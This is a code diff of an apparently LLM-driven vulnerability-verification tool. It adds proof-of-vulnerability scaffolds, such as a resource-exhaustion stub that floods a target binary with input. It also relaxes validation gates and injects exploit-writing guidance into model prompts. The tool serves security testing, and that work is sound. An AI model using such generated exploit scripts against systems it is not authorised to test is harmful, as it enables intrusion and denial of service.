+if __name__ == '__main__':
+    raise SystemExit(main())
+''',
+
+        'resource_exhaustion': '''import os, subprocess, sys, time, tempfile, resource
+
+TARGET_BINARY = os.environ.get('TARGET_BINARY') or os.environ.get('TARGET_BIN', '')
+CODEBASE_PATH = os.environ.get('CODEBASE_PATH', '/workspace/codebase')
+
+def main():
+    binary = TARGET_BINARY
+    if not binary or not os.path.isfile(binary):
+        sys.stderr.write('[PoV] TARGET_BINARY not found\\n')
+        return 1
+
+    # --- 1. Craft resource-exhausting input ---
+    workdir = tempfile.mkdtemp(prefix='autopov_re_')
+    crafted = os.path.join(workdir, 'payload.dat')
+    with open(crafted, 'wb') as f:
+        f.write(b'A' * (1024 * 1024))  # TODO: craft exhaustion payload
+
+    t0 = time.monotonic()
+    try:
+        result = subprocess.run(
+            [binary, crafted],
+            capture_output=True, text=True, timeout=60,
+        )
+        elapsed = time.monotonic() - t0
+        if elapsed > 10.0:
+            print(f'RESOURCE_EXHAUSTION:time={elapsed:.1f}s')
+        elif result.returncode in (-9, 137):  # OOM killed
+            print('RESOURCE_EXHAUSTION:oom_killed')
+    except subprocess.TimeoutExpired:
+        elapsed = time.monotonic() - t0
+        print(f'RESOURCE_EXHAUSTION:timeout={elapsed:.1f}s')
+
+    return 0
+
+if __name__ == '__main__':
+    raise SystemExit(main())
+''',
+    }
+
+    @classmethod
+    def _get_pov_scaffold_for_proof_type(cls, proof_type: str) -> str:
+        """Return a PoV scaffold template for the given proof_type.
+
+        The scaffold gives the LLM a working skeleton with correct imports,
+        TARGET_BINARY usage, and oracle marker emission patterns.
+        """
+        return cls._POV_SCAFFOLDS.get(proof_type, '')
 
     def _select_pov_language(
         self,
@@ -1666,10 +2638,24 @@ class VulnerabilityVerifier:
 
         # ── JavaScript / Node / TypeScript ─────────────────────────────────────
         if runtime in {'javascript', 'node', 'typescript', 'web'}:
+            # FIX-6: For library targets (function_call surface), always use JS so
+            # require() works natively in the same process (preserves prototype chain).
+            _probe_surface = str(contract.get('probe_input_surface') or '').strip().lower()
+            if _probe_surface == 'function_call':
+                return 'javascript'
+            # For repo_script surface on a JS/Node target, the PoV can be written in
+            # either Python (using subprocess to invoke the target) or JavaScript
+            # (using require() directly).  JavaScript is the natural choice but the
+            # LLM often generates Python.  Accept BOTH — the validator should not
+            # hard-block on language choice for repo_script since both work.
+            if surface == 'repo_script':
+                return 'javascript_or_python'
             _inprocess_js = {
                 'CWE-1321',  # Prototype Pollution
                 'CWE-94',    # Code Injection
                 'CWE-95',    # eval Injection
+                'CWE-79',    # XSS — needs JS to render template/serve response
+                'CWE-614',   # Session fixation — needs Node session middleware
             }
             if cwe in _inprocess_js:
                 return 'javascript'
@@ -1732,6 +2718,14 @@ class VulnerabilityVerifier:
         if surface in {'http_request', 'live_app'} or runtime in {'web', 'http'}:
             return 'python'
 
+        # ── repo_script with unknown runtime — accept both JS and Python ─────────
+        # When the runtime is empty/unknown (e.g. C/C++ library like tinyxml2 with
+        # surface=repo_script), the LLM may generate JS or Python PoVs.  Both are
+        # valid: Python via subprocess, JS via child_process.  Accepting both
+        # prevents the validator from blocking a correct PoV due to language choice.
+        if surface == 'repo_script':
+            return 'javascript_or_python'
+
         # ── Unknown / fallback — Python is available in every proof container ──
         return 'python'
 
@@ -1766,11 +2760,13 @@ class VulnerabilityVerifier:
             'java': 'java',
         }
         _actual_pov_lang = _script_lang_map.get(script_runtime, 'python')
-        if _actual_pov_lang != _expected_pov_lang:
+        # Flexible language matching: 'javascript_or_python' means either is acceptable.
+        _acceptable_langs = {lang.strip() for lang in _expected_pov_lang.split('_or_')}
+        if _actual_pov_lang not in _acceptable_langs:
             issues.append(
                 f'PoV language mismatch: expected {_expected_pov_lang} for this exploit type '
                 f'(CWE={cwe_type}, runtime={runtime_profile}, surface={execution_surface}) '
-                f'but got {_actual_pov_lang}. Regenerate in {_expected_pov_lang}.'
+                f'but got {_actual_pov_lang}. Regenerate in {" or ".join(_acceptable_langs)}.'
             )
         if runtime_profile in {'browser'} and re.search(r'(^|\n)\s*import\s+requests\b', pov_script or ''):
             issues.append('Browser/DOM PoV uses Python requests instead of a JavaScript/browser harness')
@@ -1780,11 +2776,102 @@ class VulnerabilityVerifier:
         if requires_explicit_entrypoint and target_entrypoint in {'', 'unknown', 'none', 'n/a'} and not target_url:
             issues.append('Exploit contract is missing a concrete target entrypoint or route for the next proof stage')
         if execution_surface == 'binary_cli' and target_entrypoint in {'', 'unknown', 'none', 'n/a'} and not binary_candidates:
-            issues.append('Native proof plan is missing a concrete binary or entrypoint for the next proof stage')
+            # Before blocking, also check contract-level binary info populated by
+            # the preflight probe — the model may not echo these in its proof_plan
+            # but the runtime pipeline already has the concrete binary path.
+            _contract_has_binary = bool(
+                str(contract.get('probe_binary_path') or '').strip()
+                or str(contract.get('target_binary') or '').strip()
+                or str(contract.get('probe_binary_name') or '').strip()
+                or binary_candidates  # also honour proof_plan.binary_candidates
+            )
+            # Also check proof_plan_json.target_binary — the LLM often
+            # identifies the target binary even when probe results were lost
+            # during the refinement phase (e.g. cJSON_test for cJSON library).
+            if not _contract_has_binary:
+                _ppj_tb2 = str((contract.get('proof_plan_json') or {}).get('target_binary') or '').strip()
+                if _ppj_tb2 and _ppj_tb2.lower() not in {'', 'unknown', 'none', 'n/a'}:
+                    _contract_has_binary = True
+            # Last-resort heuristic: extract binary name from observed help text
+            if not _contract_has_binary:
+                _obs_surf = (contract.get('runtime_feedback') or {}).get('observed_surface') or {}
+                _help = str(_obs_surf.get('help_text') or '').strip()
+                if _help:
+                    import re as _re
+                    _m = _re.match(r'^([A-Za-z0-9_.-]+):\s', _help)
+                    # Filter out common help-text section labels that are NOT binary names
+                    _HELP_LABELS2 = {'commands', 'usage', 'options', 'arguments', 'description',
+                                     'examples', 'flags', 'subcommands', 'version', 'synopsis'}
+                    if _m and _m.group(1).lower() not in {'', 'unknown', 'none', 'n/a'} and _m.group(1).lower() not in _HELP_LABELS2:
+                        _contract_has_binary = True
+            # Also check if this is a library target that should route through
+            # function_harness instead of requiring a concrete binary.
+            _repo_cls = str(contract.get('repo_surface_class') or '').strip().lower()
+            _runtime = str(contract.get('runtime_profile') or '').strip().lower()
+            _is_library_route = (
+                _repo_cls in ('library_c', 'library_c_with_cli')
+                or contract.get('probe_binary_is_test') == '1'
+                or contract.get('probe_binary_is_example') == '1'
+                or (_runtime in {'c', 'cpp', 'native', 'binary'} and not _contract_has_binary)
+            )
+            if not _contract_has_binary and not _is_library_route:
+                issues.append('Native proof plan is missing a concrete binary or entrypoint for the next proof stage')
         if requires_explicit_route and not target_url:
-            issues.append('HTTP proof plan is missing a concrete target URL or route for the next proof stage')
+            # Relax: if the contract-level execution_surface is NOT http_request/browser_dom,
+            # the proof_plan surface may be incorrectly set (model hallucination).
+            # Don't hard-block — allow the PoV generator to proceed with repo_script.
+            _contract_surf = str(exploit_contract.get('execution_surface') or '').strip().lower() if exploit_contract else ''
+            if _contract_surf not in ('http_request', 'browser_dom', 'live_app'):
+                # Contract doesn't require HTTP — downgrade surface in the plan
+                if execution_surface in ('http_request', 'browser_dom'):
+                    warnings.append(
+                        f'Proof plan surface={execution_surface} needs a target URL but contract surface={_contract_surf} does not — '
+                        'downgrading to repo_script surface for module-level PoV'
+                    )
+                    # Auto-correct the plan surface so downstream doesn't block
+                    if isinstance(plan, dict):
+                        plan['execution_surface'] = 'repo_script'
+                    execution_surface = 'repo_script'
+                else:
+                    issues.append('HTTP proof plan is missing a concrete target URL or route for the next proof stage')
+            else:
+                # Contract requires HTTP/browser but there's no URL.
+                # For LIBRARY repos (npm_package, pypi_package, etc.) this usually means
+                # the vulnerability is in the library code itself (prototype pollution,
+                # XSS in template rendering) and can be triggered by importing the module
+                # and calling the vulnerable function directly.  Auto-downgrade to repo_script
+                # so the PoV can exercise the vulnerability without a live server.
+                _repo_cls = str((exploit_contract or {}).get('repo_surface_class') or '').strip().lower()
+                _is_library = (
+                    'library' in _repo_cls
+                    or _repo_cls in ('npm_package', 'pypi_package', 'crate', 'library_c', 'library_c_with_cli')
+                )
+                _cwe_id = str(cwe_type or '').strip().upper().replace('CWE-', '')
+                _is_xss_like = _cwe_id in ('79', '80', '116')
+                _is_proto_pollution = _cwe_id in ('1321', '020', '400')
+                if _is_library and (_is_xss_like or _is_proto_pollution or execution_surface == 'browser_dom'):
+                    warnings.append(
+                        f'Library repo with {execution_surface} surface but no URL — '
+                        'downgrading to repo_script for module-level PoV (vulnerability is in library code)'
+                    )
+                    if isinstance(plan, dict):
+                        plan['execution_surface'] = 'repo_script'
+                    # Also fix the contract-level surface so the runtime doesn't choose a browser image
+                    if isinstance(exploit_contract, dict):
+                        exploit_contract['execution_surface'] = 'repo_script'
+                    execution_surface = 'repo_script'
+                else:
+                    issues.append('HTTP proof plan is missing a concrete target URL or route for the next proof stage')
         if self._is_dom_browser_finding(cwe_type, vulnerable_code, contract.get('goal') or '', filepath) and runtime_family in {'javascript', 'node', 'browser'} and execution_surface == 'repo_script':
-            issues.append('DOM/XSS finding is routed as a repo script instead of a browser-oriented proof path')
+            # Relax: for server-side XSS (Express/Flask templates), repo_script is correct —
+            # the PoV imports the module and renders templates. Only block for true DOM XSS.
+            _is_server_side_xss = bool(
+                cwe_type in ('CWE-79', '79')
+                and any(kw in str(contract.get('goal') or '').lower()
+                        for kw in ('template', 'render', 'express', 'flask', 'jinja', 'ejs', 'pug', 'handlebars'))
+            )
+            if not _is_server_side_xss:
+                issues.append('DOM/XSS finding is routed as a repo script instead of a browser-oriented proof path')
         return issues
 
     def _canonicalize_target_entrypoint(
@@ -2072,6 +3159,23 @@ class VulnerabilityVerifier:
         _ep = str(merged.get('target_entrypoint') or '').strip().lower()
         if _ep in {'', 'unknown', 'none', 'n/a'} and _merged_candidates:
             merged['target_entrypoint'] = _merged_candidates[0]
+
+        # Normalize target_binary: strip directory paths and validate names.
+        # Full paths like /workspace/codebase/enchive confuse downstream matching;
+        # names like readme_examples indicate an example binary, not the primary target.
+        _tb = str(merged.get('target_binary') or '').strip()
+        if _tb:
+            _tb = os.path.basename(_tb)  # strip directory components
+            # Detect example/demo/test binary names and clear them so the
+            # harness falls back to a more appropriate surface (function_harness).
+            _EXAMPLE_NAME_RE = re.compile(
+                r'^(?:readme[_-]?|example[_-]?|sample[_-]?|demo[_-]?|test[_-]?|bench[_-]?)',
+                re.IGNORECASE,
+            )
+            if _EXAMPLE_NAME_RE.match(_tb):
+                merged.pop('target_binary', None)
+            else:
+                merged['target_binary'] = _tb
         merged['success_indicators'] = [str(x) for x in self._coerce_listish(merged.get('success_indicators') or defaults.get('success_indicators', ['VULNERABILITY TRIGGERED'])) if str(x).strip()]
         merged['trigger_steps'] = [str(x) for x in self._coerce_listish(merged.get('trigger_steps') or defaults.get('trigger_steps', [])) if str(x).strip()]
         merged['inputs'] = [str(x) for x in self._coerce_listish(merged.get('inputs') or defaults.get('inputs', [])) if str(x).strip()]
@@ -2087,6 +3191,16 @@ class VulnerabilityVerifier:
             ]
             merged['success_indicators'] = list(dict.fromkeys([*merged['success_indicators'], *native_indicators]))
         explicit_plan = contract.get('proof_plan') if isinstance(contract, dict) else {}
+        # Inject probe_binary_path into proof_plan.binary_candidates so both the
+        # model and downstream validators have access to the concrete binary path
+        # discovered by the preflight probe.
+        if isinstance(explicit_plan, dict):
+            _probe_bin = str((contract or {}).get('probe_binary_path') or '').strip()
+            if _probe_bin:
+                _existing_bc = list(explicit_plan.get('binary_candidates') or [])
+                if _probe_bin not in _existing_bc:
+                    explicit_plan = dict(explicit_plan)
+                    explicit_plan['binary_candidates'] = [_probe_bin, *_existing_bc]
         merged['proof_plan'] = self._normalize_proof_plan(
             explicit_plan or {},
             cwe_type,
@@ -2191,6 +3305,49 @@ class VulnerabilityVerifier:
                     ]
                     if candidates:
                         merged['target_binary'] = candidates[0]
+                    else:
+                        # 3. Extract binary name from observed help text
+                        # (e.g. "enchive: missing command" -> "enchive")
+                        # Covers the case where probe results were not propagated
+                        # to the contract by the refinement phase.
+                        _obs_surf = rf_inner.get('observed_surface') or {}
+                        _help = str(_obs_surf.get('help_text') or '').strip()
+                        if _help:
+                            import re as _re
+                            _m = _re.match(r'^([A-Za-z0-9_.-]+):\s', _help)
+                            # Filter out common help-text section labels that are NOT binary names
+                            _HELP_LABELS3 = {'commands', 'usage', 'options', 'arguments', 'description',
+                                             'examples', 'flags', 'subcommands', 'version', 'synopsis'}
+                            if _m and _m.group(1).lower() not in _invalid and _m.group(1).lower() not in _HELP_LABELS3:
+                                _hint = _m.group(1)
+                                if self._binary_like_target(
+                                    _hint, filepath=filepath,
+                                    target_entrypoint=merged.get('target_entrypoint') or ''
+                                ):
+                                    merged['target_binary'] = _hint
+                                    # Also inject into binary_candidates so downstream
+                                    # gates and the binary locator can use it
+                                    _plan = dict(merged.get('proof_plan') or {})
+                                    _existing_bc = list(_plan.get('binary_candidates') or [])
+                                    if _hint not in _existing_bc:
+                                        _plan['binary_candidates'] = [_hint, *_existing_bc]
+                                        merged['proof_plan'] = _plan
+                        # 4. Use proof_plan_json.target_binary as a fallback.
+                        # The LLM often identifies the correct binary (e.g. cJSON_test)
+                        # even when probe results were lost during refinement.
+                        if not merged.get('target_binary') or str(merged['target_binary']).strip().lower() in _invalid:
+                            _ppj_tb3 = str((merged.get('proof_plan_json') or {}).get('target_binary') or '').strip()
+                            if _ppj_tb3 and _ppj_tb3.lower() not in _invalid:
+                                if self._binary_like_target(
+                                    _ppj_tb3, filepath=filepath,
+                                    target_entrypoint=merged.get('target_entrypoint') or ''
+                                ):
+                                    merged['target_binary'] = _ppj_tb3
+                                    _plan = dict(merged.get('proof_plan') or {})
+                                    _existing_bc = list(_plan.get('binary_candidates') or [])
+                                    if _ppj_tb3 not in _existing_bc:
+                                        _plan['binary_candidates'] = [_ppj_tb3, *_existing_bc]
+                                        merged['proof_plan'] = _plan
 
         # -- Persist known_subcommands as a first-class contract field.
         # Both _validate_proof_plan and the scaffold prompt read from here.
@@ -2373,6 +3530,12 @@ class VulnerabilityVerifier:
 
     def _should_use_native_library_fallback(self, exploit_contract: Optional[Dict[str, Any]], filepath: str, vulnerable_code: str) -> bool:
         contract = exploit_contract or {}
+        # c_library_harness targets must NOT use the CLI-binary fallback —
+        # they need an inline harness generated by the LLM, not a binary invoker.
+        _exec_surf_fb = str(contract.get('execution_surface') or '').strip().lower()
+        _repo_surf_fb = str(contract.get('repo_surface_class') or '').strip().lower()
+        if _exec_surf_fb == 'c_library_harness' or _repo_surf_fb in ('library_c', 'library_c_with_cli'):
+            return False
         runtime_profile = str(contract.get('runtime_profile') or self._infer_runtime_profile_from_filepath(filepath) or '').lower()
         if runtime_profile not in {'c', 'cpp', 'native', 'binary'}:
             return False
@@ -2617,9 +3780,17 @@ class VulnerabilityVerifier:
     # Bootstrap: run keygen non-interactively to create key material
     home_dir = os.environ.get('AUTOPOV_BOOTSTRAP_HOME') or HOME or '/tmp/autopov_home'
     os.makedirs(home_dir, exist_ok=True)
+    # Ensure the config subdirectory exists (e.g. ~/.config/enchive/)
+    _tool_name = os.path.basename(binary) if binary else 'unknown'
+    _tool_cfg = os.path.join(home_dir, '.config', _tool_name)
+    os.makedirs(_tool_cfg, exist_ok=True)
     boot_env = dict(os.environ)
     boot_env['HOME'] = home_dir
-    boot_result = subprocess.run([binary, {boot_sub!r}], input='autopov\\nautopov\\n', capture_output=True, text=True, env=boot_env)
+    # Try keygen with --derive first (works for enchive and similar tools)
+    boot_result = subprocess.run([binary, {boot_sub!r}, '--derive'], capture_output=True, text=True, env=boot_env)
+    # If --derive failed, try plain keygen with stdin passphrase
+    if boot_result.returncode not in (0, 1):
+        boot_result = subprocess.run([binary, {boot_sub!r}], input='autopov\\nautopov\\n', capture_output=True, text=True, env=boot_env)
     # If keygen itself crashes with a sanitizer error, that IS the vulnerability — report it.
     boot_triggered = emit_if_triggered(boot_result.stdout, boot_result.stderr, boot_result.returncode)
     if boot_triggered == 0:
@@ -2673,12 +3844,13 @@ def emit_if_triggered(stdout: str, stderr: str, exit_code: int) -> int:
         or exit_code in (134, 139, -11, -6)
     )
     if crash_detected:
-        # Pass through the subprocess output so the oracle sees the real crash evidence,
-        # then print VULNERABILITY TRIGGERED as a confirmation marker.
+        # Pass through the subprocess output so the oracle sees the real crash evidence.
         sys.stdout.write(stdout or '')
         sys.stderr.write(stderr or '')
+        # Emit the evidence marker conditionally — only when real crash evidence is present.
+        # This is NOT unconditional self-report; the oracle verifies crash markers.
         print('VULNERABILITY TRIGGERED')
-        return 0
+        return exit_code
     sys.stdout.write(stdout or '')
     sys.stderr.write(stderr or '')
     return exit_code
@@ -2705,8 +3877,92 @@ if __name__ == '__main__':
             'target_language': runtime_profile,
             'exploit_contract': contract,
             'generation_time_s': 0.0,
-            'timestamp': datetime.utcnow().isoformat(),
+            'timestamp': datetime.now(timezone.utc).isoformat(),
             'model_used': 'deterministic_native_harness_fallback',
+            'cost_usd': 0.0,
+            'token_usage': {},
+            'openrouter_usage': None,
+        }
+
+    def _synthesize_fallback_pov(
+        self,
+        language: str,
+        cwe_type: str,
+        filepath: str,
+        vulnerable_code: str,
+        explanation: str,
+        exploit_contract: Optional[Dict[str, Any]],
+    ) -> Optional[Dict[str, Any]]:
+        """FIX-7: Generate a minimal runnable PoV scaffold for non-native languages.
+
+        When an offline model misfires (returns investigation JSON instead of a PoV
+        scaffold), `_synthesize_native_library_fallback_pov` only handles C/C++.
+        This method produces minimal but runnable scaffolds for Python, JavaScript,
+        and Java targets so the refinement loop has something concrete to improve.
+        """
+        contract = exploit_contract or {}
+        entrypoint = str(contract.get('target_entrypoint') or 'unknown').strip()
+        short_explanation = (explanation or '')[:120].replace('\n', ' ')
+
+        templates = {
+            'python': (
+                'import os, subprocess, sys\n'
+                '\n'
+                'CODEBASE = os.environ.get("CODEBASE_PATH", "/workspace/codebase")\n'
+                f'# Target: {entrypoint} in {filepath}\n'
+                f'# {short_explanation}\n'
+                '# TODO: Import and call the vulnerable function with crafted input\n'
+                'try:\n'
+                '    sys.path.insert(0, CODEBASE)\n'
+                '    # Add exploit logic here — import the module and invoke the vulnerable entrypoint\n'
+                '    raise NotImplementedError("scaffold PoV — requires refinement")\n'
+                'except NotImplementedError:\n'
+                '    print("SCAFFOLD: needs refinement", file=sys.stderr)\n'
+                '    sys.exit(1)\n'
+                'except Exception as e:\n'
+                '    print(f"EXCEPTION: {e}", file=sys.stderr)\n'
+                '    sys.exit(1)\n'
+            ),
+            'javascript': (
+                'const path = require("path");\n'
+                'const LIB = process.env.LIB_REQUIRE_PATH || "/workspace/codebase";\n'
+                f'// Target: {entrypoint}\n'
+                f'// {short_explanation}\n'
+                'try {\n'
+                '    const target = require(LIB);\n'
+                '    // Add exploit logic here — call the vulnerable function with crafted input\n'
+                '    throw new Error("scaffold PoV — requires refinement");\n'
+                '} catch(e) {\n'
+                '    console.error("EXCEPTION:", e.message);\n'
+                '    process.exit(1);\n'
+                '}\n'
+            ),
+            'java': (
+                'public class AutoPoV {\n'
+                '    public static void main(String[] args) throws Exception {\n'
+                '        String jar = System.getenv("TARGET_JAR");\n'
+                '        String classpath = System.getenv("CLASSPATH");\n'
+                f'        // Target: {entrypoint}\n'
+                f'        // {short_explanation}\n'
+                '        // Add exploit logic here — use Class.forName() or direct import\n'
+                '        throw new RuntimeException("scaffold PoV — requires refinement");\n'
+                '    }\n'
+                '}\n'
+            ),
+        }
+        script = templates.get(language)
+        if not script:
+            return None
+        return {
+            'success': False,
+            'pov_script': script,
+            'pov_language': language,
+            'target_language': language,
+            'error': 'offline_model_misfire_scaffold',
+            'exploit_contract': contract,
+            'generation_time_s': 0.0,
+            'timestamp': datetime.now(timezone.utc).isoformat(),
+            'model_used': f'deterministic_{language}_scaffold_fallback',
             'cost_usd': 0.0,
             'token_usage': {},
             'openrouter_usage': None,
@@ -2796,6 +4052,50 @@ if __name__ == '__main__':
         return {"pov_script": pov_script, "exploit_contract": self._normalize_exploit_contract({}, cwe_type, explanation, vulnerable_code, filepath=filepath)}
 
     
+    def _postprocess_pov_script(self, pov_script: str) -> str:
+        """Apply deterministic post-processing fixes to extracted PoV scripts.
+
+        This catches common model mistakes that AST-based detection may not
+        fix in time (e.g. TARGET_BINARY shadowing, tempfile.tempdir misuse).
+        """
+        if not pov_script:
+            return pov_script
+        # Auto-fix common TARGET_BINARY shadowing: model reassigns the
+        # module-level variable inside a function using os.environ.get.
+        # Only match INDENTED lines (\s+ = inside a function), and consume
+        # the full line so the trailing arguments aren't left dangling.
+        _before = pov_script
+        pov_script = re.sub(
+            r'(?m)^(\s+)TARGET_BINARY\s*=\s*os\.environ\.get\([^)]*\).*$',
+            r'\1# FIXED: removed TARGET_BINARY shadowing (using module-level value)\n\1binary = TARGET_BINARY',
+            pov_script,
+        )
+        # If the regex fired AND there is no module-level TARGET_BINARY definition,
+        # inject one so the name is available at runtime.
+        if pov_script != _before and not re.search(
+            r'(?m)^TARGET_BINARY\s*=', pov_script
+        ):
+            # Insert after the last top-level import line (or at the top).
+            _insert = 'TARGET_BINARY = os.environ.get("TARGET_BINARY") or os.environ.get("TARGET_BIN", "")\n'
+            _last_import = -1
+            for _idx, _line in enumerate(pov_script.splitlines()):
+                stripped = _line.lstrip()
+                if stripped.startswith('import ') or stripped.startswith('from '):
+                    _last_import = _idx
+            if _last_import >= 0:
+                _lines = pov_script.splitlines(keepends=True)
+                _lines.insert(_last_import + 1, '\n' + _insert)
+                pov_script = ''.join(_lines)
+            else:
+                pov_script = _insert + pov_script
+        # Fix tempfile.tempdir() misuse (tempdir is an attribute, not a function)
+        if 'tempfile.tempdir()' in pov_script:
+            pov_script = pov_script.replace('tempfile.tempdir()', 'tempfile.mkdtemp()')
+        # Ensure tempfile is imported when used
+        if 'import tempfile' not in pov_script and ('NamedTemporaryFile' in pov_script or 'mkdtemp' in pov_script):
+            pov_script = 'import tempfile\n' + pov_script
+        return pov_script
+
     def _is_offline_model_selected(self, model_name: Optional[str] = None) -> bool:
         selected_model = (model_name or settings.MODEL_NAME or '').strip()
         return settings.is_offline_model(selected_model)
@@ -2896,9 +4196,21 @@ if __name__ == '__main__':
         }
 
     def _get_llm(self, model_name: Optional[str] = None, purpose: str = "general"):
-        """Get LLM instance based on configuration"""
+        """Get LLM instance based on configuration.
+
+        FIX-8: Session-level singleton — reuses the same LLM object when
+        (model_name, purpose) matches a previously created instance.  Avoids
+        redundant HTTP session setup and token negotiation per call.
+        """
         llm_config = settings.get_llm_config(model_name=model_name)
         actual_model = model_name or llm_config["model"]
+
+        # FIX-8: Check singleton cache first
+        _cache_key = (actual_model, purpose)
+        if not hasattr(self, '_llm_cache'):
+            self._llm_cache: dict = {}
+        if _cache_key in self._llm_cache:
+            return self._llm_cache[_cache_key]
         
         if llm_config["mode"] == "online":
             if not OPENAI_AVAILABLE:
@@ -2925,6 +4237,7 @@ if __name__ == '__main__':
             
             if model_name is None:
                 self._llm = llm
+            self._llm_cache[_cache_key] = llm
             return llm
         else:
             if not OLLAMA_AVAILABLE:
@@ -2951,6 +4264,7 @@ if __name__ == '__main__':
             
             if model_name is None:
                 self._llm = llm
+            self._llm_cache[_cache_key] = llm
             return llm
     
     def generate_pov(
@@ -2970,6 +4284,7 @@ if __name__ == '__main__':
         probe_context: str = '',
         repo_input_hints: Optional[Dict[str, Any]] = None,
         joern_context: str = '',
+        recon_report: Optional[Dict[str, Any]] = None,
     ) -> Dict[str, Any]:
         """
         Generate a PoV script for a vulnerability
@@ -2990,7 +4305,15 @@ if __name__ == '__main__':
         Returns:
             Dictionary with PoV script and metadata
         """
-        start_time = datetime.utcnow()
+        start_time = datetime.now(timezone.utc)
+
+        # ── IMPROVEMENT 2.1: Enhanced context injection ─────────────────────
+        # Extract test cases, binary info, and build details to provide richer context
+        _enhanced_context = self._extract_enhanced_context(codebase_path, exploit_contract or {}, filepath)
+        if _enhanced_context:
+            # Merge into code_context for prompt injection
+            code_context = (code_context or '') + '\n\n' + _enhanced_context
+        # ─────────────────────────────────────────────────────────────────────
 
         # ── Deterministic entrypoint override for CodeQL findings ─────────────
         # CodeQL findings always have a known enclosing function; we must never
@@ -3023,7 +4346,7 @@ if __name__ == '__main__':
         preflight_for_gate = {'issues': audit_issues} if audit_issues else None
         gate_blocking = self._contract_gate(normalized_contract, gate_family, preflight=preflight_for_gate)
         if gate_blocking:
-            end_time = datetime.utcnow()
+            end_time = datetime.now(timezone.utc)
             return {
                 'status': 'contract_gate_failed',
                 'success': False,
@@ -3076,7 +4399,12 @@ if __name__ == '__main__':
                 obs_surface_for_prompt = {}
                 try:
                     rf = runtime_feedback or {}
-                    obs = rf.get('observed_surface') or {}
+                    obs = dict(rf.get('observed_surface') or {})
+                    # Fallback: exploit_contract may have observed_surface populated by probe data
+                    contract_obs = dict((exploit_contract or {}).get('observed_surface') or {})
+                    for key, val in contract_obs.items():
+                        if not obs.get(key):
+                            obs[key] = val
                     surface_opts = obs.get('options') or None
                     subcommands_for_prompt = normalized_contract.get('known_subcommands') or None
                     obs_surface_for_prompt = obs
@@ -3094,6 +4422,7 @@ if __name__ == '__main__':
                     subcommands=subcommands_for_prompt,
                     offline=True,
                     observed_surface=obs_surface_for_prompt,
+                    recon_report=recon_report,
                 )
             else:
                 _obs_surface = dict((runtime_feedback or {}).get('observed_surface') or {})
@@ -3117,6 +4446,7 @@ if __name__ == '__main__':
                     probe_context=probe_context or '',
                     observed_surface=_obs_surface,
                     joern_context=joern_context or '',
+                    recon_report=recon_report,
                 )
 
             # If the contract was corrected to binary_cli (CLI binary confirmed), append
@@ -3132,6 +4462,74 @@ if __name__ == '__main__':
                     "Invoke the binary via subprocess using os.environ['TARGET_BINARY'], "
                     "pass a real subcommand and crafted input, and let ASan/SIGSEGV detect the crash."
                 )
+            # ── Non-crash proof type: inject forceful behavioral verification guidance ──
+            _proof_strategy = normalized_contract.get('proof_strategy') or {}
+            _proof_type_val = str(_proof_strategy.get('proof_type', '')).strip().lower()
+            _non_crash_types = ('behavioral_deviation', 'state_change', 'information_disclosure', 'observable_output')
+            _all_non_crash = ('behavioral_deviation', 'state_change', 'information_disclosure',
+                              'observable_output', 'exception', 'timing_difference', 'resource_exhaustion')
+            if _proof_type_val in _all_non_crash:
+                _obs_ev = _proof_strategy.get('observable_evidence', [])
+                prompt = prompt.rstrip() + (
+                    f"\n\nCRITICAL — NON-CRASH PROOF TYPE ({_proof_type_val}): "
+                    "This vulnerability does NOT produce a crash or sanitizer output. "
+                    "Do NOT check for AddressSanitizer, SIGSEGV, SIGABRT, or exit codes 134/139. "
+                    "Instead, after invoking the binary, perform POST-EXECUTION VERIFICATION: "
+                    "check filesystem state (os.path.exists, os.stat for permissions), "
+                    "output content, or other observable side effects. "
+                    f"The oracle expects these EXACT evidence markers in stdout: {_obs_ev}. "
+                    "You MUST print these exact strings when the vulnerability condition is confirmed. "
+                    "Example: if os.path.exists(suspect_path): print('FILE_CREATED_OUTSIDE_ALLOWED_DIR:' + suspect_path)\n\n"
+                    "CORRECT subprocess usage for non-crash proofs:\n"
+                    "  result = subprocess.run([binary, input_path], capture_output=True, text=True, timeout=30)\n"
+                    "  stdout = result.stdout or ''   # NO .decode() when text=True is used\n"
+                    "  stderr = result.stderr or ''   # NO .decode() when text=True is used\n\n"
+                    "WARNING: The #1 cause of non-crash PoV failures is mixing text=True with .decode(). "
+                    "If you use text=True, result.stdout is already a string. Calling .decode() crashes the PoV."
+                )
+                # Append exploitation approach hint if available in contract
+                _exploit_approach = str(normalized_contract.get('exploitation_approach') or '').strip()
+                if not _exploit_approach:
+                    # Derive from finding_context if available
+                    try:
+                        from agents.finding_context import FindingContext, _infer_exploitation_approach
+                        _fc = FindingContext(
+                            root_cause=str(normalized_contract.get('root_cause') or ''),
+                            impact=str(normalized_contract.get('impact') or ''),
+                            vulnerable_code=str(normalized_contract.get('vulnerable_code') or ''),
+                            code_context=str(normalized_contract.get('code_context') or ''),
+                            trigger_steps=list(normalized_contract.get('trigger_steps') or []),
+                        )
+                        _exploit_approach = _infer_exploitation_approach(_fc)
+                    except Exception:
+                        pass
+                if _exploit_approach:
+                    prompt = prompt.rstrip() + (
+                        f"\n\nEXPLOITATION APPROACH: {_exploit_approach}"
+                    )
+                # Append scaffold template as starter code
+                _scaffold = self._get_pov_scaffold_for_proof_type(_proof_type_val)
+                if _scaffold:
+                    prompt = prompt.rstrip() + (
+                        f"\n\nSTARTER CODE — Use this as a skeleton and modify it for the specific vulnerability. "
+                        f"Replace TODO comments with exploit-specific logic:\n```python\n{_scaffold}```"
+                    )
+                # Include format-specific starter payload if available
+                # This gives the LLM a valid file structure to mutate instead of
+                # crafting an entire file format from scratch (which often fails).
+                _ec_exts = list(normalized_contract.get('probe_inferred_extensions') or [])
+                _filepath_ext = os.path.splitext(filepath or '')[-1].lower()
+                if _filepath_ext and _filepath_ext not in _ec_exts:
+                    _ec_exts.insert(0, _filepath_ext)
+                for _ext in _ec_exts:
+                    _payloads = get_format_payloads(_ext)
+                    if _payloads:
+                        prompt += (
+                            f"\n\nSTARTER INPUT — A minimal valid {_ext} file structure. "
+                            f"Modify it to embed the malicious payload that triggers the vulnerability:\n"
+                            f"```python\nSTARTER_PAYLOAD = {_payloads[0]!r}\n```\n"
+                        )
+                        break
             llm = self._get_llm(model_name, purpose="pov")
             
             # Universal system prompt — applies to ALL models (online and offline).
@@ -3141,6 +4539,22 @@ if __name__ == '__main__':
                 'javascript': 'JavaScript', 'node': 'JavaScript',
                 'php': 'PHP', 'ruby': 'Ruby', 'go': 'Go',
             }.get(pov_language, 'Python')
+            # Rule 6 tells the model not to compile — but c_library_harness REQUIRES compilation.
+            _is_lib_harness_gen = _plan_surface == 'c_library_harness'
